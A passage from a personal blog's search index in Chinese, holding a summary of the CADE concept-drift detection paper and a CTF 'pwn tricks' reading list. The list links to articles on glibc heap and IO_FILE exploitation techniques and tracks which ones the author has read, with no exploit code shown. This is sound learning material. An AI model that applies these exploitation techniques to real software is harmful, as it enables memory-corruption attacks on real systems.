)，预测概率可能会被极大地误导。许多先前的研究(例如,将错误的类与高概率相关联)。从根本上说，预测概率仍然继承了分类器的”封闭世界假设”，因此不适合检测漂移样本。</p><p>与预测概率相比，一个更有前途的方向是直接评估样本对给定类的拟合度。其思想是，与评估样本在A类中是否比B类更好不同，我们评估该样本在A类中与A类中其他训练样本相比的拟合程度。例如，自动编码器可以根据重构误差来评估样本对给定分布的拟合程度。然而，作为一种无监督方法，自动编码器在忽略标签(见第4节)的情况下，很难学习到训练分布的准确表示。在最近的一项工作中，若尔达内等人引入了一个名为Transcend的系统。它将一种”不符合度量”定义为适应度评价。Transcend使用一个可信度p值来量化测试样本xxx与共享同一类别的训练样本的相似程度。p是该类别中的样本与xxx中的其他样本至少不相似的比例。虽然这种度量可以准确地指出漂移的样本，但这样的系统高度依赖于对”相异性”的良好定义。</p><p>在高层，我们首先使用对比学习来学习训练数据的压缩表示。对比学习的一个关键好处是，相比于无监督方法，如自编码器和主成分分析( Principal Component Analysis，PCA ) ，它可以利用现有的标签来获得更好的性能。这使得我们可以从训练数据中学习一个距离函数来检测漂移样本。对于解释模块，我们将描述一个基于距离的解释公式来应对上述挑战。</p><p>解释模块旨在识别驱动测试样本远离现有类的最重要特征。具体来说，给定一个漂移样本xt，以及它在训练集中的最近类yt，我们想找出一个小的特征集合，使得xt成为类yt的离群点。为了实现这一目标，一个本能的反应是将其转换为一个监督学习模型的解释问题，这是一个很好的研究领域。由于离群空间的高度稀疏性，我们发现很难移动一个漂移样本来跨越决策边界，从而无法得出有意义的解释。受此启发，我们设计了一种新的针对漂移检测的解释方法，该方法解释了漂移样本与类内样本之间的距离，而不是决策边界。<br><img src="/../static/CADE/CADE-2.png" alt="[Pasted image 20240709104648.png]"><br>我们提出了一种新的方法，通过解释距离(即图3中的红色箭头)来识别重要特征。与基于决策边界进行决策的有监督分类器不同，漂移检测模型根据样本到质心的距离进行决策。因此，我们的目标是找到一组有助于将漂移样本xt移动到最近的质心yt的原始特征。通过这样的设计，我们不再需要强迫xt跨越边界，这是难以实现的。相反，我们对原始特征进行扰动，观察潜在空间中的距离变化。要实现这一想法，首先需要设计一个特征扰动机制。现有的大多数扰动方法都是针对图像设计的，其特点是数值性。在我们的案例中，xxxt中的特征可以是数值型的，也可以是分类型的，因此直接应用现有的方法会产生定义不明确的特征值。为了确保扰动对数值特征和类别特征都有意义，我们提出用参考训练样本中对应特征的值替换其特征值来扰动xt。<br><img src="/../static/CADE/CADE-3.png" alt="[Pasted image 20240709105344.png]"><br>同时也有助于保证扰动后的样本向着质心的粗略方向移动。与之前一样，扰动是在原始特征空间中进行的，其中特征具有语义含义。</p><h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><p>本文的主要贡献有三：<br>提出了CADE来补充现有的基于监督学习的安全应用，以对抗概念漂移。我们介绍了一种基于对比表示学习的有效方法来检测漂移样本。<br>我们说明了监督解释方法在解释离群样本方面的局限性，并针对这种情况介绍了一种基于距离的解释方法。<br>我们通过两个应用对所提出的方法进行了广泛的评估。我们对一家证券公司的初步测试表明，CADE是有效的。我们在此发布了CADE的代码1，以支持未来的研究。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 科研 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 未知攻击检测 </tag>
+            
+            <tag> attack detect </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn-tricks</title>
+      <link href="/2024/07/01/pwn-tricks/"/>
+      <url>/2024/07/01/pwn-tricks/</url>
+      
+        <content type="html"><![CDATA[<p>该文档主要收录一些我觉得讲的很好的一些关于pwn的trick<br />（为便于学习参与学习的大家可以在最后自增一列用于标记自己的学习进度，记录一下自己哪些是看过的了hhhhhhhhhhhhhhhhh）<br /></p><table><thead><tr><th>tick name</th><th>url</th><th>keyboard看过了？</th></tr></thead><tbody><tr><td>堆漏洞挖掘中malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD</td><td><a href="https://blog.csdn.net/qq_41453285/article/details/97627411">https://blog.csdn.net/qq_41453285&#x2F;article&#x2F;details&#x2F;97627411</a></td><td>1</td></tr><tr><td>Glibc PWN“堆风水”应用详解</td><td><a href="https://www.freebuf.com/vuls/235626.html">https://www.freebuf.com/vuls/235626.html</a></td><td>1</td></tr><tr><td>关于fastbin合并问题的研究</td><td><a href="https://bbs.kanxue.com/thread-257742.htm">https://bbs.kanxue.com/thread-257742.htm</a></td><td>1</td></tr><tr><td>PWN题目中malloc_consolidate()利用浅析</td><td><a href="https://juejin.cn/post/6844903816031125518">https://juejin.cn/post/6844903816031125518</a></td><td>1</td></tr><tr><td>the house of rabbit（超详细）</td><td><a href="https://bbs.kanxue.com/thread-280246.htm">https://bbs.kanxue.com/thread-280246.htm</a></td><td>0</td></tr><tr><td>堆喷射技术入门</td><td><a href="https://segmentfault.com/a/1190000044165958">https://segmentfault.com/a/1190000044165958</a></td><td>1</td></tr><tr><td>堆喷思想在glibc pwn中的应用</td><td><a href="https://xz.aliyun.com/t/7189?time__1311=n4+xnD0GDtKx9lDuDBqroGktkGQG8RSQmYeD&alichlgref=https://www.freebuf.com/">https://xz.aliyun.com/t/7189?time__1311&#x3D;n4%2BxnD0GDtKx9lDuDBqroGktkGQG8RSQmYeD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.freebuf.com%2F</a></td><td>1</td></tr><tr><td>Heap Spray：高危漏洞的垫脚石</td><td><a href="https://www.cnblogs.com/Fang3s/articles/3911561.html">https://www.cnblogs.com/Fang3s/articles/3911561.html</a></td><td>1</td></tr><tr><td>TSCTF2019 薛定谔的堆块-HeapSpray</td><td><a href="https://pig-007.github.io/2021/08/18/TSCTF2019%20%E8%96%9B%E5%AE%9A%E8%B0%94%E7%9A%84%E5%A0%86%E5%9D%97-HeapSpray/#2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%EF%BC%9A">https://pig-007.github.io/2021/08/18/TSCTF2019%20%E8%96%9B%E5%AE%9A%E8%B0%94%E7%9A%84%E5%A0%86%E5%9D%97-HeapSpray/#2-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%EF%BC%9A</a></td><td>1,考虑复现</td></tr><tr><td>IO_FILE利用：利用_IO_2_1_stdout泄露libc</td><td><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;113845320</a></td><td>1</td></tr><tr><td>House of pig 原理详解&amp;实战（高版本IO_FILE）–比较复杂的攻击</td><td><a href="http://t.csdnimg.cn/axITU">http://t.csdnimg.cn/axITU</a></td><td>0，考虑复现</td></tr><tr><td>Tcache Stashing Unlink Attack 原理详解</td><td><a href="http://t.csdnimg.cn/vIJJP">http://t.csdnimg.cn/vIJJP</a></td><td>1</td></tr><tr><td>Heap Exploit 2.31</td><td><a href="https://github.com/StarCross-Tech/heap_exploit_2.31">https://github.com/StarCross-Tech/heap_exploit_2.31</a></td><td>0考虑复现</td></tr><tr><td>glibc-2.31中的tcache stashing unlink与large bin attack</td><td><a href="http://t.csdnimg.cn/01drX">http://t.csdnimg.cn/01drX</a></td><td>1</td></tr><tr><td>house of  banana</td><td><a href="https://www.anquanke.com/post/id/222948#h3-5">https://www.anquanke.com/post/id/222948#h3-5</a></td><td>0</td></tr><tr><td>浅入研究 tcache_perthread_struct</td><td><a href="https://blog.csdn.net/qq_29912475/article/details/134978851">https://blog.csdn.net/qq_29912475&#x2F;article&#x2F;details&#x2F;134978851</a></td><td>1</td></tr><tr><td>通过mmap&amp;mprotect来绕过nx</td><td><a href="http://t.csdnimg.cn/WgOng">http://t.csdnimg.cn/WgOng</a></td><td>1</td></tr><tr><td>house of fmt 非栈上的fmt</td><td><a href="https://www.freebuf.com/vuls/284210.html">https://www.freebuf.com/vuls/284210.html</a></td><td>1</td></tr><tr><td>[CTF]PWN–非栈上格式化字符串漏洞</td><td><a href="http://t.csdnimg.cn/4sILP">http://t.csdnimg.cn/4sILP</a></td><td>1</td></tr><tr><td>[CTF]PWN–手搓格式化字符串漏洞</td><td><a href="https://blog.csdn.net/2301_79880752/article/details/136178764?spm=1001.2014.3001.5501">https://blog.csdn.net/2301_79880752&#x2F;article&#x2F;details&#x2F;136178764?spm&#x3D;1001.2014.3001.5501</a></td><td>1</td></tr><tr><td>house of apple 1-2-3</td><td><a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></td><td>1</td></tr><tr><td><a href="https://www.anquanke.com/post/id/235598">house of kiwi</a></td><td><a href="https://www.anquanke.com/post/id/235598">house of kiwi</a></td><td>1</td></tr><tr><td><a href="https://www.anquanke.com/post/id/260614">house of emma</a></td><td><a href="https://www.anquanke.com/post/id/260614">house of emma</a></td><td>1</td></tr><tr><td><a href="https://www.anquanke.com/post/id/242640">house of pig</a></td><td><a href="https://www.anquanke.com/post/id/242640">house of pig</a></td><td>1</td></tr><tr><td>House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解</td><td><a href="https://bbs.kanxue.com/thread-273895.htm">https://bbs.kanxue.com/thread-273895.htm</a></td><td>0</td></tr><tr><td>堆利用详解：the house of storm</td><td><a href="https://bbs.kanxue.com/thread-280333.htm">https://bbs.kanxue.com/thread-280333.htm</a></td><td>0</td></tr><tr><td>深入理解Pwn_IO_FILE及相关赛题</td><td><a href="https://bbs.kanxue.com/thread-279380.htm">https://bbs.kanxue.com/thread-279380.htm</a></td><td>1</td></tr><tr><td>深入理解Pwn_Heap及相关例题</td><td><a href="https://bbs.kanxue.com/thread-278871.htm">https://bbs.kanxue.com/thread-278871.htm</a></td><td>1</td></tr><tr><td>Tcache安全机制及赛题详细解析(gundam &amp;&amp; House of Atum)</td><td><a href="https://bbs.kanxue.com/thread-278105.htm">https://bbs.kanxue.com/thread-278105.htm</a></td><td>0</td></tr><tr><td>第七届“湖湘杯” House _OF _Emma &#124; 设计思路与解析</td><td><a href="https://www.anquanke.com/post/id/260614">https://www.anquanke.com/post/id/260614</a></td><td>1</td></tr><tr><td>House OF Kiwi</td><td><a href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a></td><td>1</td></tr><tr><td>多手法联合IO利用之House of pig 学习利用</td><td><a href="https://xz.aliyun.com/t/12916?time__1311=mqmhqIx+xkGNDQtPBKPAKY0KD=WDtes3C4D&alichlgref=https://xz.aliyun.com/t/12934?time__1311=mqmhqIx%252Bxfx0hxBqDTWxUE%253Dx9DAOq6rCoD&alichlgref=https%253A%252F%252Fcn.bing.com%252F">https://xz.aliyun.com/t/12916?time__1311&#x3D;mqmhqIx%2BxkGNDQtPBKPAKY0KD%3DWDtes3C4D&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Ft%2F12934%3Ftime__1311%3DmqmhqIx%252Bxfx0hxBqDTWxUE%253Dx9DAOq6rCoD%26alichlgref%3Dhttps%253A%252F%252Fcn.bing.com%252F</a></td><td>1</td></tr><tr><td>glibc 2.31 pwn——house of pig原题分析与示例程序</td><td><a href="http://t.csdnimg.cn/BiNVQ">http://t.csdnimg.cn/BiNVQ</a></td><td>1</td></tr><tr><td>i春秋2020新春战役PWN之BFnote (修改TLS结构来bypass canary)</td><td><a href="http://t.csdnimg.cn/dC98r">http://t.csdnimg.cn/dC98r</a></td><td>1</td></tr><tr><td>roarctf 2020 PWN 2a1—虚表指针加密问题</td><td><a href="https://bbs.kanxue.com/thread-264469.htm">https://bbs.kanxue.com/thread-264469.htm</a></td><td>0</td></tr><tr><td>新版本glibc下的IO_FILE攻击</td><td><a href="https://www.anquanke.com/post/id/216290">https://www.anquanke.com/post/id/216290</a></td><td>0</td></tr><tr><td>通过LIBC基址来爆破TLS</td><td><a href="https://blog.wjhwjhn.com/posts/%e9%80%9a%e8%bf%87libc%e5%9f%ba%e5%9d%80%e6%9d%a5%e7%88%86%e7%a0%b4tls/">https://blog.wjhwjhn.com/posts/%e9%80%9a%e8%bf%87libc%e5%9f%ba%e5%9d%80%e6%9d%a5%e7%88%86%e7%a0%b4tls/</a></td><td>0</td></tr><tr><td>从两道题目学习 exit_hook</td><td><a href="https://zhuanlan.zhihu.com/p/576942474">https://zhuanlan.zhihu.com/p/576942474</a></td><td>1</td></tr><tr><td>malloc_printerr劫持</td><td><a href="https://bbs.kanxue.com/thread-272471.htm#msg_header_h1_3">https://bbs.kanxue.com/thread-272471.htm#msg_header_h1_3</a></td><td>1</td></tr><tr><td>house of husk</td><td><a href="https://www.anquanke.com/post/id/202387">https://www.anquanke.com/post/id/202387</a></td><td>1</td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr><tr><td><br /></td><td></td><td><br /></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> trick </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
